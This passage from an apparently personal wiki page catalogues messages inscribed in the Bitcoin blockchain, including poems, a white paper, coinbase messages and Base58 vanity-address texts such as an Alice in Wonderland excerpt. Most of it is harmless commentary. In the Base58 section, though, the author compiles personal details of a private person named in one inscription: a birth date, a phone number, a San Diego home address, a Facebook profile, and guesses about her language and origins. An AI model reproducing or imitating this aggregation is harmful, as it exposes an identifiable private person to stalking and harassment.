- [tx 5f62490ca4736da30da35ebc3f86156dbdb529dcb2f77cb8b0eb84868d567b00](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0410.txt#L1134) ([2016-05-05](https://www.blockchain.com/explorer/transactions/btc/5f62490ca4736da30da35ebc3f86156dbdb529dcb2f77cb8b0eb84868d567b00)) via [cryptograffiti.info](#cryptograffiti-info) contains a poem entitled:<a id="_977"></a>
  > Voor mijn jongere broeder

  whichi is [Dutch](continent.md#netherlands) for;<a id="_978"></a>
  > For my younger brother

  No [Google](google.md) hits, so possibly novel.
<a id="_979"></a>
- [tx 0809e7f31d074eefc0f1f02463a28b5238688aa73e6361c01cbc7b1848ac8d93](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0475.txt#L406) ([2017-07-10](https://www.blockchain.com/explorer/transactions/btc/0809e7f31d074eefc0f1f02463a28b5238688aa73e6361c01cbc7b1848ac8d93)) via [cryptograffiti.info](#cryptograffiti-info) contains a [white paper](social-technology.md#white-paper) entitled:<a id="_980"></a>
  > Disincentivizing Double-Spending by Making it Unprofitable

  by [Erich Ertsu](#image-erich-erstu) from Coingaming Group (July, 2017). He was previously the creator of [cryptograffiti.info](#cryptograffiti-info) This is the startup: [https://www.crunchbase.com/organization/coingaming](https://www.crunchbase.com/organization/coingaming), previously at [https://coingaming.io](https://coingaming.io) but now moved to[https://yolo.com](https://yolo.com). The paper does not seem to be reproduced anywhere on the clearweb, the blockchain was its primary location of publication.
<a id="_981"></a>
- [tx e450166eba552202fb6984867f2b851e2399c5a0ae05026bf6b056176491ec5d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0456.txt#L1169) ([2017-03-11](https://www.blockchain.com/explorer/transactions/btc/e450166eba552202fb6984867f2b851e2399c5a0ae05026bf6b056176491ec5d))<a id="_982"></a>
  > Here are some of the reasons why Tau is better than [Pi](formalization-of-mathematics.md#pi) as a universal constant for circles.
<a id="_983"></a>
- <a id="_984"></a>
  [tx 0f25e23b7b59fde67d8b2d41b749e4f89fd1ff8061aa0ddac8c27c8230167e35](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0481.txt#L181) ([2017-08-18](https://www.blockchain.com/explorer/transactions/btc/0f25e23b7b59fde67d8b2d41b749e4f89fd1ff8061aa0ddac8c27c8230167e35)):<a id="_985"></a>


  > A Crosschain transaction was sent in to your address in error. The transaction was [9174f24946496823e4edaf3fe1676a404164178d1c848fa476113bbe2f5b9463](https://www.blockchain.com/btc/tx/9174f24946496823e4edaf3fe1676a404164178d1c848fa476113bbe2f5b9463) . Please return to [1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV](https://www.blockchain.com/explorer/addresses/btc/1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV). Thank you in advance."

  Epic. The transaction sent:<a id="_986"></a>

  <a id="_987"></a>
  - 0.23225200 to [1BqyRKHoLEKgHGUoDiFUEZu5jPaWeuCWWt](https://www.blockchain.com/explorer/addresses/btc/1BqyRKHoLEKgHGUoDiFUEZu5jPaWeuCWWt)
  <a id="_988"></a>
  - 5.6 BTC to [1JG8EVTx1zWzDyctAD5fFuMt59TWkSw2dW](https://www.blockchain.com/explorer/addresses/btc/1JG8EVTx1zWzDyctAD5fFuMt59TWkSw2dW)
  [1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV](https://www.blockchain.com/explorer/addresses/btc/1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV) never received anything back so far.

  <a id="_989"></a>
  The message is encoded as fake 12 P2PKH outputs, followed by an actual address, presumably the message target, but none of the addresses is one of the above targets of the transaction, so how did they know to associate the addreses? They must have extra hidden data?
<a id="_990"></a>
- [tx 057954bb28527ff9c7701c6fd2b7f770163718ded09745da56cc95e7606afe99](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0666.txt#L655), [block 666666](https://www.blockchain.com/explorer/blocks/btc/666666) (2021-01-18):<a id="_991"></a>
  > Do not be overcome by evil, but overcome evil with good - [Romans 12:21](religion.md#epistle-to-the-romans)

  As highlighted at [https://www.reddit.com/r/Bitcoin/comments/vxletr/message_was_embedded_in_block_666666/](https://www.reddit.com/r/Bitcoin/comments/vxletr/message_was_embedded_in_block_666666/) the block number is a reference to the [number of the beast](religion.md#number-of-the-beast). Later also posted on another Reddit thread: [A Weird Message Was Embedded in Bitcoin’s 666,666th Block — Turns Out It’s a Bible Verse (2025)](https://www.reddit.com/r/CryptoCurrency/comments/1k30xcv/a_weird_message_was_embedded_in_bitcoins_666666th/)

<a id="_992"></a>
TODO:<a id="_993"></a>

<a id="_994"></a>
- <a id="_995"></a>
  55a5d0c09ad5535711d649fdab394add3bb6e50cc2c49920cf0cb758ff0b69e8 via [cryptograffiti.info](#cryptograffiti-info) contains what seems to be a ASCII table tracking train movements? Maybe from a train lover? But also curiously, it is GPG signed:<a id="_996"></a>

  ```
  -----BEGIN PGP SIGNED MESSAGE-----
  Hash: SHA256

  time    direction    # covered    #uncovered    notes
  11/11/2013 6:31pm    E    4    1    csx 6243
  11/19/2013 4:46pm    E    3    0    csx 6215
  11/19/2013 5:44pm    W    4    0    Amtrak
  11/21/2013 4:05pm    E    0    0    csx 6206
  ```
  Interesting.

  <a id="_997"></a>
  86c1b7bd8bbdd8903355a8f6a408616621fd2ea4321b9aced778f388afe0b244 has something similar.
<a id="_998"></a>
- cc38d740dc1999a803dbba0c48a82af994861e0767f6bcd7d6ceebe4e66b4678 via [cryptograffiti.info](#cryptograffiti-info) contains a pipe dream technical proposal idea entitled:<a id="_999"></a>
  > Attack-resistant decentralized time and location services via Nakamoto chain consensus.
<a id="_1000"></a>
- 5d9ef37e6beea5342ce1cb2681a7b465a542394aeda2b1e1fed00fab44b17833 via [cryptograffiti.info](#cryptograffiti-info) contains a test of every character from 0 to 255, e.g. some of the readable characters are:<a id="_1001"></a>

  ```
  65:              A
  66:              B
  67:              C
  68:              D
  69:              E
  70:              F
  71:              G
  72:              H
  73:              I
  74:              J
  75:              K
  76:              L
  77:              M
  ```

  d5f6614b4e3bdc611c8ad15f158163e48e1a1298ea5f5f9832ada8db6e2dd4b2 has something similar.
<a id="_1002"></a>
- 0f96b2f6e3c4f4b6319efbafd2e7148d507b260b4d7914766e79aec7d9ac9574 via [cryptograffiti.info](#cryptograffiti-info) has a long-ish message that looks like a software release note, not sure what it is about:<a id="_1003"></a>

  ```
  Truecrypt 7.1a
  ==============

  2015-07-19

  I am setting the filesizes and checksums of the last Truecrypt version (7.1a) in stone.
  ```
<a id="_1004"></a>
- 206a0edb11ba0677248709d9bc5210b35e8a03710d9bb19c6f1e4e254bf21f5e via [cryptograffiti.info](#cryptograffiti-info) has a letter to [AGI](artificial-intelligence.md#artificial-general-intelligence):<a id="_1005"></a>
  > Dear Artificial Intelligence,

  While cute, the author clearly underestimates the magnitude of [singularity](artificial-intelligence.md#singularity)!
<a id="_1006"></a>
- cdbeb50c11b788fa4e67e00fb2e2607b129492a4a38bed0a9e31443a42e272a4 via [cryptograffiti.info](#cryptograffiti-info) contains a semi-philosophical text that starts with:<a id="_1007"></a>
  > When in the course of cosmic evolution,
<a id="_1008"></a>
- b55c3312ceeeb4ab422b658f5f4d5884775a498ddde6a527fca7b67752e1b044 via [cryptograffiti.info](#cryptograffiti-info) contains some wedding vows starting with and GPG-signed:<a id="_1009"></a>
  > <a id="_1010"></a>
  > Zachary Thomas Smith,
  > 
  > <a id="_1011"></a>
  > I give myself - Jenna Marie Vaziri - to you, to be your wife, your best friend, and your home - just as you are to me.
<a id="_1012"></a>
- <a id="_1013"></a>
  3620da027df2e2e34ac9abe0123dcd7217fc5b8dec9921cbae258c640c7a6591 via [cryptograffiti.info](#cryptograffiti-info) contains a neatly formatted [UTF-8](telecommunication.md#utf-8) ad with a link to: [https://bitcointalk.org/index.php?topic=1033773.0](https://bitcointalk.org/index.php?topic=1033773.0)<a id="_1014"></a>

  ```
  ╭───────────────────────────────────────────────────────────────────────────╮
  │    B&C EXCHANGE:  A decentralized cryptocurrency exchange for everyone    │
  ┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥
  │             https://bitcointalk.org/index.php?topic=1033773.0             │
  │                                                                           │
  │ B&C Exchange will be an open-source decentralized exchange that completes │
  │ cryptocurrency  trades between  users by utilizing multisig signers  that │
  │ compete for blockchain  rewards based on their effectiveness and honesty. │
  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
  ┆          ▷▶▷▶    There are 10 days  left in the auction!    ◀◁◀◁          ┆
  ╰───────────────────────────────────────────────────────────────────────────
  ```
  The thread links to [https://bcexchange.org/](https://bcexchange.org/) which is dead as of 2024.

  <a id="_1015"></a>
  f93e128c59b357ca2d1b256eb1c4d991c488da460527ca0898dc789210073bd2 has another one:<a id="_1016"></a>

  ```
  ┏━━ UTF-8 is coming to CryptoGraffiti.info!!! ━━┓
  ┠╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┨
  ┃ I love you.                          Σ΄αγαπώ. ┃
  ┃               Ma armastan sind.               ┃
  ┃ Aš tave myliu.               Mä rakastan sua. ┃
  ┃                 Я люблю тебя.                 ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ```
<a id="_1017"></a>
- 140562ceb42fc8943fa52ccc0ddbb11ca2d88dae9b5240d7a4b46864538c515a<a id="_1018"></a>
  > Reddit on the Bitcoin blockchain Test

  TODO understand this part:<a id="_1019"></a>

  ```
  The "Address" you see above is more than a bitcoin address? For example, the web address to this

  reddit thread is: https://www.reddit.com/r/Bitcoin/comments/3cdxep/reddit_on_the_blockchain_test/

  Which converts to the bitcoin address of:
  12uPLj6PSz6ULnZi1jXo7Ch1Je1SuqxRcE

  How? Because any text, like a web address, can be converted into a bitcoin address.

  www.reddit.com = 1MZCEUCtyJCDkNSLYbPVvAgf9V3CsEw3t
  www.google.com = 1JEZLaFciACHDEMVd3RXZzPmGcsWEwYQLr
  www.voat.com = 1JvCp9X5Bvvt2kz3EqP5ppkzX62sKgKbqr
  www.paystamper.com = 14wgeaWz2rKax8iVSWNFSrSsAYNeGyNdkt
  Duriel@paystamper.com = 1HcuhfTAiQCt6KdMG2rZLXsTcKYj9nLDhS
  ```
<a id="_1020"></a>
- 940f41f5cc96182c1392c239d7570f94bd524e141ca0a88fdb154bd817049f83.bin via [cryptograffiti.info](#cryptograffiti-info) contains some links to profiles controlled by a "Daniel Michael Abraham" [https://www.linkedin.com/in/daniel-abraham-9432a798/](https://www.linkedin.com/in/daniel-abraham-9432a798/). Other messages by him:<a id="_1021"></a>

  <a id="_1022"></a>
  - 3d39024fa0cddfc529d4a41501df7a076f5bcf9a7a43f88f54a717e6df7f4770
  <a id="_1023"></a>
  - 088ebf7ffdef96b8fcac7eafa2ff6d04f295ea24f159e1ce4b7d47ed7b91b1f9

#### Software

↑ **Parent:** [Text](#text)

<a id="_1024"></a>
[GitHub](software.md#github) is for newbs.

<a id="_1025"></a>
<a id="_1026"></a>
- 50002f38a40aeca96f7d03ceac1c62fc233b44207af99df8f1daddf03f6ef61c via [cryptograffiti.info](#cryptograffiti-info) contains a [Python](programming-language.md#python-programming-language) script that starts with:<a id="_1027"></a>

  ```
  #!/usr/bin/env python3
  #
  # This file is placed in the public domain.
  #
  # CryptoGraffiti tool
  #
  # Requires python-bitcoinlib-v0.2.1
  #
  # https://github.com/petertodd/python-bitcoinlib
  #
  # pip install python-bitcoinlib
  ```
<a id="_1028"></a>
- 209c9106c7261582f5d0907819c6e10dea670c273133047d911be41f8a42d86f via [cryptograffiti.info](#cryptograffiti-info) contains a [Base64](computer.md#base64) encoded Python script starting in:<a id="_1029"></a>

  ```
  #!/usr/bin/env python
  # brainwallet "base58"
  # v2015-05-18, fixed Tor DNS problem
  import binascii
  import hashlib
  ```

  Some related ones:<a id="_1030"></a>

  <a id="_1031"></a>
  - 25658f625c8f3964593b9e3c632040cb69aea9cf24403af33ab173d7cba7c42f
  <a id="_1032"></a>
  - 7d188bd499137b5a0d68271ef8a4f3c4dc2f2b38bd03dfc913cb2b0be15b1e0d

#### Cute Coinbase messages

↑ **Parent:** [Text](#text)  
🏷️ **Tags:** [Coinbase message](cryptocurrency.md#coinbase-message)

<a id="_1034"></a>
[Coinbase message](cryptocurrency.md#coinbase-message) are messages that only [miners](cryptocurrency.md#cryptocurrency-mining) can embed in the blockchain.

<a id="_1035"></a>
As such most of them tend to be boring ads for [mining pools](cryptocurrency.md#mining-pool), but there are a few exceptions, especially in the early days.

##### HHTT

↑ **Parent:** [Cute Coinbase messages](#cute-coinbase-messages)

<a id="_1037"></a>
The [Horrible Horrendous Terrible Tremendous](cryptocurrency.md#horrible-horrendous-terrible-tremendous) Mining Pool inscribed a few cute [Coinbase messages](cryptocurrency.md#coinbase-message) during their operation in 2012-2013.

<a id="_1038"></a>
Many of their messages also mention `SockThing`, which was part of their mining infrastructure:<a id="_1039"></a>

<a id="_1040"></a>
- [http://hhtt.1209k.com/sockthing.php](http://hhtt.1209k.com/sockthing.php)
<a id="_1041"></a>
- [https://github.com/fireduck64/SockThing](https://github.com/fireduck64/SockThing)

<a id="_1042"></a>
Starting from their very first ASCII transaction on [block 197602](https://www.blockchain.com/explorer/blocks/btc/197602) (2012-09-07), there is what seems to be a poem spread across several transactions. Some of the lines are repeated, presumably because they didn't update the current line to a new line and so mined the same thing multiple times:<a id="_1043"></a>


> I am a pretty princess  
> covered in mud and blood  
> water with stuff in it  
> like everything else that wiggles or jiggles  
> screaming might not be your waY  
> see no reason to operate otherwise since  
> came into the world naked, wet and screaming  
> but silence will never be mine  
> until I am dead  
> but the smell will also give that away  
> gather all my things  
> load them in a big boat  
> airlift that to Kansas  
> and light it on fire  
> drop it from 7,000 feet  
> then railgun my corpse straight down

The sentences are not very coherent together, perhaps this is because lines were chosen by different miners one at a time.

#### Base58 messages

↑ **Parent:** [Text](#text)

<a id="_1045"></a>
Bitcoin addresses are by convention expressed in [Base58](computer.md#base58), which is a human readable [binary-to-text encoding](computer.md#binary-to-text-encoding) invented by Bitcoin.

<a id="_1046"></a>
It is a bit like [Base64](computer.md#base64), but obsessed with eliminating characters that look like one another in popular but stupid fonts like capital "I" and lower case ell "l". As such, any embedded text is rather obfuscated due to this limitations, and people often resort to [leet](https://ourbigbook.com/go/topic/leet)-like replacements such as '1' to represent 'I'.

<a id="_1047"></a>
This seems to be one of the earliest strategies used to encode messages into the [Bitcoin blockchain](cryptocurrency.md#bitcoin). The first known example appears in 2011. Then starting November 2011, a large number of messages were inscribed n short successsion, presumably by a single person or small group.

<a id="_1048"></a>
The interest in Base58 encoding might have initially arisen with people's desire to have "[vanity addresses](cryptocurrency.md#vanity-address)", that is [Bitcoin addresses](cryptocurrency.md#bitcoin-address) that have real words in them, much like [vanity plates](cryptocurrency.md#vanity-plate) or [vanity numbers](cryptocurrency.md#vanity-number). Such addresses with long words in them are hard to find while keeping the address spendable, because they have to correspond to a [private key](cryptography.md#public-key-cryptography). An extreme notable example is:<a id="_1049"></a>


> [1EMBARraSSABLezwXrdWu1dDAVMMdJ7Ci2](https://www.blockchain.com/explorer/addresses/btc/1EMBARraSSABLezwXrdWu1dDAVMMdJ7Ci2)

which contains the awkward 13 letter word:<a id="_1050"></a>


> embarrassable

in it. TODO: proof that it is pendable?

<a id="_1051"></a>
Perhaps inspired by this, some people also decided to use Base58 addresses as a way to create more general unspendable [inscriptions](social-technology.md#inscription-blockchain), even even though the method is much more clumsy and complicated than [P2FKHS](cryptocurrency.md#fake-p2pkh-address). There is however a certain art to working under limitations.

<a id="image-total-burn-addresses-as-a-function-of-time-found-by-bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/Total_burn_address_vs_time_by_Khatib_Legout.png" alt="" height="600">

**[Figure 91](#image-total-burn-addresses-as-a-function-of-time-found-by-bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes). Total burn addresses as a function of time found by Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes**. Although it is not solely focused on inscriptions and may also contain functional burn addresses, it is likely that the methods of Khatib/Legout capture the overall trend of base58 inscription counts.

<a id="_1052"></a>
These messages were originally found with: [https://github.com/cirosantilli/bitcoin-inscription-indexer#payload-size-out-utxo-2vals](https://github.com/cirosantilli/bitcoin-inscription-indexer#payload-size-out-utxo-2vals) which tracks the largest transactions with unspent outputs.  
[Bitcoin Burn Addresses: Unveiling the Permanent Losses and Their Underlying Causes](#bitcoin-burn-addresses-unveiling-the-permanent-losses-and-their-underlying-causes) later revealed many new ones.

<a id="_1053"></a>
Finding Base58 messages is intrinsically hard for a few reasons<a id="_1054"></a>

<a id="_1055"></a>
- the words may be garbled by Base58 leet
<a id="_1056"></a>
- only very small ammounts of data can be encoded at a time, and all of it contains ASCII, so you can't just "find all long ASCII strings" as we started doing for other ASCII inscriptions a la [`strings -n20`](software.md#strings-binutils); you have to use some dictionary as a basis
<a id="_1057"></a>
- the Base58 does not show up raw on the blockchain, as it is just a human representation for the actual binary data that does, so you can't just [strings](software.md#strings-binutils) the blockchain, you have to parse it

<a id="_1058"></a>
The interesting following transactions contain base58 encoded messages on addresses, sorted chronologically, and heighlighted either due to their earliness or historical or artistic quality:

<a id="_1059"></a>
<a id="_1060"></a>
- on two transactions of block 124726 (2011-05-18) someone created two addresses whose base58 differs only by one character, `W` in one is replaced by `x` in he other:<a id="_1061"></a>

  <a id="_1062"></a>
  - [1ByteCoinAddressesMatch1kpCWNXmHKW](https://www.blockchain.com/explorer/addresses/btc/1ByteCoinAddressesMatch1kpCWNXmHKW) in [tx c8348659071d4c56cccc5f33379586d71dd97e3468316558fe3c51b808acc8fd](https://www.blockchain.com/explorer/transactions/btc/c8348659071d4c56cccc5f33379586d71dd97e3468316558fe3c51b808acc8fd)
  <a id="_1063"></a>
  - [1ByteCoinAddressesMatch1kpCxNXmHKW](https://www.blockchain.com/explorer/addresses/btc/1ByteCoinAddressesMatch1kpCxNXmHKW) in [5fa33898655cb949e26712316840b941158c334634d3b80b82e29ce08dd7ebca](https://www.blockchain.com/explorer/transactions/btc/5fa33898655cb949e26712316840b941158c334634d3b80b82e29ce08dd7ebca)

  [https://bitcointalk.org/index.php?topic=20955.msg264038#msg264038](https://bitcointalk.org/index.php?topic=20955.msg264038#msg264038) How is this address possible? (2011-06-22) user [ByteCoin](https://bitcointalk.org/index.php?action=profile;u=490) suggests that this was done to highlight the fact that the checksum at the end of base58 addresses against 1 character changes. They also highlight another pair where addresses are equal except for two adjacent swapped characters: `18` -\> `81`<a id="_1064"></a>

  ```
  1ByteCoinAddressesMatchcNN781jjwLY
  1ByteCoinAddressesMatchcNN718jjwLY
  ```

  but these are not present in the blockchain itself.
<a id="_1065"></a>
- Around July 2011 there seems to have been a surge of interest in [vanity addresses](cryptocurrency.md#vanity-address), and it appears that someone was "squatting" long lists of interesting addresses that they managed to generate for later sale. These addresses are present in the hundreds in a few transactions chains, and they do not seem to contain any coherent messages across the outputs. Most encode [given names](linguistics.md#given-name), which would be the easiest type of address to sell. This theory is proposed e.g. at: [https://bitcointalk.org/index.php?topic=84569.msg992950#msg992950](https://bitcointalk.org/index.php?topic=84569.msg992950#msg992950) and it seems as the most plausible one to us. An example of this is [tx acdd81bab63ee42e28296dd5c21e8a29392e409026fc206acf5931b12a31141d](https://www.blockchain.com/explorer/transactions/btc/acdd81bab63ee42e28296dd5c21e8a29392e409026fc206acf5931b12a31141d) block 136273 (2011-07-14) which starts off with:<a id="_1066"></a>

  ```
  1MeNDez2hmZoehh5JAtS2ZJQfAFZFfSQSi
  1ALonzoPwyf8CNVQnVNXNBjacPXaUdZGgm
  1MattieiicNRfse5jTVU2X8pX6Cyr7BZVR
  1TraciFRboW661p1LfRaULwwefeo8KtQa
  ```

  For the purposes of this museum, this is a noteworty event, but it has little artistic value for large ammounts of bulk, and therefore also serves as noise that must be removed if we want to find other more personal and varied inscriptions. We will keep a list of such transactions at: [Section "Bitcoin 2011 vanity address pool"](cryptocurrency.md#bitcoin-2011-vanity-address-pool).
<a id="_1067"></a>
- [`1MartinHaferkorncii112o11HdkMrtttD`](https://www.blockchain.com/explorer/addresses/btc/1MartinHaferkorncii112o11HdkMrtttD) on [tx dab55eefd5cef495719a43bbd190c57c8ca60ecc45d630edf3442b2096965a97](https://www.blockchain.com/explorer/transactions/btc/dab55eefd5cef495719a43bbd190c57c8ca60ecc45d630edf3442b2096965a97) block 152851 (2011-11-11) encodes the name:<a id="_1068"></a>
  > Martin Haferkorn

  Likely:<a id="_1069"></a>

  <a id="_1070"></a>
  - [https://www.efinance.wiwi.uni-frankfurt.de/en/team/alumni/dr-martin-haferkorn.html](https://www.efinance.wiwi.uni-frankfurt.de/en/team/alumni/dr-martin-haferkorn.html)
  <a id="_1071"></a>
  - [https://scholar.google.com/citations?hl=de&user=BNLeMMAAAAAJ&view_op=list_works&sortby=pubdate](https://scholar.google.com/citations?hl=de&user=BNLeMMAAAAAJ&view_op=list_works&sortby=pubdate)
<a id="_1072"></a>
- <a id="_1073"></a>
  [`1EricLombrozoXXXXXXXXXXXXXXXWACBVB`](https://www.blockchain.com/explorer/addresses/btc/1EricLombrozoXXXXXXXXXXXXXXXWACBVB) appears on 3 separate transactions on 2011-11-24:<a id="_1074"></a>

  <a id="_1075"></a>
  - block 154630:<a id="_1076"></a>

    <a id="_1077"></a>
    - [tx 65a3a76d26b9ba82d1419368311727d46452341bd62c3de543eb79a7b918642b](https://www.blockchain.com/explorer/transactions/btc/65a3a76d26b9ba82d1419368311727d46452341bd62c3de543eb79a7b918642b)
    <a id="_1078"></a>
    - [tx 87b34e465fb96d7c73345e1a3b14e4326905e850fa5ab569bf2b3f4ec650214c](https://www.blockchain.com/explorer/transactions/btc/87b34e465fb96d7c73345e1a3b14e4326905e850fa5ab569bf2b3f4ec650214c) burns 0.005 BTC
  <a id="_1079"></a>
  - block 154637: [tx dea183908e40e0cebfee6a0d8362b299e07cf193fbc02ffd3308b43781eca208](https://www.blockchain.com/explorer/transactions/btc/dea183908e40e0cebfee6a0d8362b299e07cf193fbc02ffd3308b43781eca208). This one is more interesting and also contains a second output, both at 0.005 BTC<a id="_1080"></a>
    > 1969SandraSandicXXXXXXXXXXXXXvdEiU

    so possibly a wedding token of Eric with Sandra Sandic after two previous test transactions. This also possibly gives Sandra's birth year of 1969. Pinged him at: [https://x.com/cirosantilli/status/1904212575211901129](https://x.com/cirosantilli/status/1904212575211901129).
  Alsmost certainly this guy:<a id="_1081"></a>

  <a id="_1082"></a>
  - [https://www.linkedin.com/in/ericlombrozo/](https://www.linkedin.com/in/ericlombrozo/)
  <a id="_1083"></a>
  - [https://x.com/eric_lombrozo](https://x.com/eric_lombrozo)
  [https://www.officialusa.com/names/Sandra-Sandic/](https://www.officialusa.com/names/Sandra-Sandic/) suggests a link between Eric and Sandra sharing phone number (858) 461-1843 and residing at 12631 El Camino Real, San Diego, CA. Eric's LinkedIn marks him as living in San Diego, and Sandra's birthday is marked 1969-01-05, so matching the inscription year. The address shows as a regular appartment block on [Google Maps](software.md#google-maps), so maybe they are not crazy rich, or they have restraint. [https://besthistorysites.net/name/eric-lombrozo](https://besthistorysites.net/name/eric-lombrozo) reconfirms the address.

  <a id="_1084"></a>
  In 2023 [this Sandra Sandic on Facebook](https://www.facebook.com/sandra.sandic.3) liked [this post related](https://www.facebook.com/story.php/?story_fbid=563741739148161&id=100065370197668&_rdr) to a show in San Diego, giving a possible profile. At [this post](https://www.facebook.com/sandra.sandic.3/posts/pfbid0s92xQqhSRGWyRNU4PKfWZQQ8LVmxofvet7sGHnQ8REfxLJPvSFKKSuKwSnwt1fQsl) she links to [this story](https://www.cnbc.com/2017/06/20/bitcoin-millionaire-erik-finman-says-going-to-college-isnt-worth-it.html) about [Erik Finman](cryptocurrency.md#erik-finman), young [Bitcoin](cryptocurrency.md#bitcoin) millionaire, thus establishing an interest link between that profile and Bitcoin. She also has various posts in Bosnian, so she speaks the language and is likely a [first generation immigrant](science.md#first-generation-immigrant).

  <a id="image-eric-lombrozo"></a>
  ![](https://web.archive.org/web/20250323225851im_/https://cryptotutor.in/images/crypto-celebrity/eric.jpg)

  **[Figure 92](#image-eric-lombrozo). Eric Lombrozo**. [Source](https://cryptotutor.in/crypto-celebrity/eric-lombrozo). Off-chain image. He's just a cool nerd like us.
<a id="_1085"></a>
- <a id="_1086"></a>
  [`1BitTaLkTVChristmasSpeciaLXXRix9Ea`](https://www.blockchain.com/explorer/addresses/btc/1BitTaLkTVChristmasSpeciaLXXRix9Ea) is repeated a dozen times on transactions between [tx 8e2bacf9971ce1a29d69d1a0484bfaa198257cc116530c7415ab6c38ae54ebc3](https://www.blockchain.com/explorer/transactions/btc/8e2bacf9971ce1a29d69d1a0484bfaa198257cc116530c7415ab6c38ae54ebc3) block 154721 (2011-11-25) and 2011-11-27.

  <a id="_1087"></a>
  It is a quick ad for the [BitTalk.tv Christmas Special](https://web.archive.org/web/20120219155246/http://bittalk.tv/?p=114) by Matthew N. Wright. [https://bitcointalk.org/index.php?topic=3025298.0](https://bitcointalk.org/index.php?topic=3025298.0) mentions he is the founder bittalk.tv and co-founder of [Bitcoin Magazine](https://ourbigbook.com/go/topic/bitcoin-magazine). TODO is the video still watchable somewhere? Also announced at: [https://bitcointalk.org/index.php?topic=52712](https://bitcointalk.org/index.php?topic=52712). As of 2025, the domain had been reappropriated as a [SolarMovie](https://ourbigbook.com/go/topic/solarmovie) mirror. It is quite likely that all the large set of message that follow were inscribed by him. Related:<a id="_1088"></a>

  <a id="_1089"></a>
  - [https://www.reddit.com/r/Bitcoin/comments/ruo73/matthew_n_wright_scammer_of_bitcoinmagazine_and/](https://www.reddit.com/r/Bitcoin/comments/ruo73/matthew_n_wright_scammer_of_bitcoinmagazine_and/) Matthew N. Wright, scammer of BitcoinMagazine and BBBB (2012)
  <a id="_1090"></a>
  - [https://www.reddit.com/r/Bitcoin/comments/znhsj/matthew_n_wright_apologizes/](https://www.reddit.com/r/Bitcoin/comments/znhsj/matthew_n_wright_apologizes/) Matthew N. Wright "apologizes" (2012)

  <a id="_1091"></a>
  Later on there is also another variant addresses [`11Bitta1ktvchristmasspecia1WNDvAa`](https://www.blockchain.com/explorer/addresses/BTC/11Bitta1ktvchristmasspecia1WNDvAa) on repeated almost 300 times on [tx ace9524519577138ca98ec01651758fd1e5ec33ce0110c6681eccba0e716cc7a](https://www.blockchain.com/btc/tx/ace9524519577138ca98ec01651758fd1e5ec33ce0110c6681eccba0e716cc7a) block 155545 (2011-12-01)

  <a id="_1092"></a>
  Other likely mentions of Matthew N Wright:<a id="_1093"></a>

  <a id="_1094"></a>
  - [`11MatthewLovesmandaXXXXXXXXabCJPY`](https://www.blockchain.com/explorer/addresses/btc/11MatthewLovesmandaXXXXXXXXabCJPY) on [tx d7c57205d69420dc7f4593b4de0806c9ec96f4755b64315cd034bd4b0b90dc2a](https://www.blockchain.com/explorer/transactions/btc/d7c57205d69420dc7f4593b4de0806c9ec96f4755b64315cd034bd4b0b90dc2a) block 155698 (2011-12-01) has a quick love declaration:<a id="_1095"></a>
    > Matthew loves Amanda
  <a id="_1096"></a>
  - [`1MatthewNWrightisaScammer124DNsfX`](https://www.blockchain.com/explorer/addresses/btc/1MatthewNWrightisaScammer124DNsfX) is etched twice
<a id="_1097"></a>
- [tx 28ccf29cfcc9f82d42793db770e7c7894d61ccf3d18299f34bda2e54415da287](https://www.blockchain.com/explorer/transactions/btc/28ccf29cfcc9f82d42793db770e7c7894d61ccf3d18299f34bda2e54415da287) block 154769 (2011-11-25) contains a short excerpt from [Alice in Wonderland](https://ourbigbook.com/go/topic/alice-in-wonderland)<a id="_1098"></a>

  ```
  1But1DontWantToGoAmongMadxxxzDmyW6
  1Peop1eA1iceRemarkedxxxxxxxxxuLyKu
  12ohYouCantHe1pThatxxxxxxxxxzCjyMs
  19SaidTheCatWereA11MadHerexxyTvEir
  191mMadYoureMadxxxxxxxxxxxxxvwA4Up
  1HowDoYouKnow1mMadSaidA1icexxZA4Nr
  12YouMustBeSaidTheCatxxxxxxxz2tFa2
  12orYouWou1dntHaveComeHerexxvtHbqq
  ```

  Original text referred to:<a id="_1099"></a>
  > But I don't want to go among mad people," Alice remarked. "Oh, you can't help that," said the Cat: "we're all mad here. I'm mad. You're mad." "How do you know I'm mad?" said Alice. "You must be," said the Cat, "or you wouldn’t have come here."
<a id="_1100"></a>
- [tx 3bbd94d22346a3bfb44257293e10c3b5c9ee39230c1cd358bdce2bf03c61ba0b](https://www.blockchain.com/explorer/transactions/btc/3bbd94d22346a3bfb44257293e10c3b5c9ee39230c1cd358bdce2bf03c61ba0b) (block 154965 , 2011-11-27) contains 49 base58 messages on a single transaction transcribing [this version](https://fiefgoldenlake.proboards.com/thread/30870/passages?page=3) of the [Emerald Tablet](https://ourbigbook.com/go/topic/emerald-tablet), a type of mystical medieval text:<a id="_1101"></a>

  ```
  12TisTrueWithoutALie22222221wT3qjn
  1CertainAndMostTrue2222222225YPnJF
  12ThatWhich1sBe1ow1sAs222221y3G7mv
  12ThatWhich1sAboveAnd2222221vxkcEq
  ...
